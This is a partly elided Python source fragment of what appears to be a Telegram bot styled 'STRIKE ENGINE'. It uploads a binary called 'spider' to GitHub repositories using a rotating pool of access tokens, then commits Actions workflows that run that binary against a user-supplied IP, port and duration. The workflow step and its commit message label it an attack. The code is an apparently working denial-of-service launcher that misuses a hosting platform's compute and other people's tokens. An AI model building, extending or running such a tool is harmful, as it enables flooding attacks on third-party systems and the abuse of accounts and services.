        ...
        for token_data in github_tokens:
            ...
            try:
                ...
                try:
                    ...
                    repo.create_file(".github/workflows/keep", "Init workflows", "")
                # Upload binary with executable permissions (GitHub stores as blob, permission set via .gitattributes or manual)
                try:
                ...
                success_count += 1
                results.append((username, True, "✅ Uploaded"))
            except Exception as e:
...
async def addtoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        ...
        try:
            repo.create_file(".github/workflows/keep", "Init", "")
        except:
            pass
...
# ============================================================
# ===== ATTACK COMMAND (POWER + TOKEN ROTATION + STATUS CHECK) =====
# ============================================================
    ...
    try:
        ...
        for attempt in range(total_tokens):
            ...
            try:
                ...
                # Check if spider exists (optional)
                try:
                    repo.get_contents("spider")
                except Exception as e:
                    logger.warning(f"⚠️ spider not found in {candidate['repo']}: {e}")
                    # Continue anyway, we'll try to push workflow

                # Create unique YAML content with random comment to force commit
...
jobs:
  attack:
    ...
    - run: chmod +x spider || true
    - run: sudo ./spider {ip} {port} {time_val} 200
"""
                commit_msg = f"Attack {ip}:{port} - {uuid.uuid4().hex[:6]}"
                # Try to update or create workflow file
                try:
                ...
                # Success! Update index for next attack
                current_token_index = (idx + 1) % total_tokens
                valid_token = candidate
                used_index = idx
                logger.info(f"✅ Attack pushed with token @{candidate['username']}. Next index: {current_token_index}")
                break
                ...
                if e.status in [401, 404]:
                    ...
                    if total_tokens == 0:
                        break
                    # Adjust current_token_index if needed
        ...
        async def check_workflow():
            await asyncio.sleep(12)  # Give GitHub time to start workflow
            try:
                    ...
                    if wf.name == "attack":
                        ...
                        if runs.totalCount > 0:
                            ...
                            if status == "completed" and conclusion == "success":
                                await update.message.reply_text("✅ Workflow executed successfully.")
                            elif status == "completed" and conclusion != "success":
                                await update.message.reply_text(f"⚠️ Workflow finished with {conclusion}. Check GitHub Actions logs.")
                            else:
                                await update.message.reply_text(f"⏳ Workflow status: {status}")
                        break
            except Exception as e:
...
def main():
    try:
        ...
        logger.info("⚡ STRIKE ENGINE v3.3 is ONLINE (Power + Rotation + Status Check)")
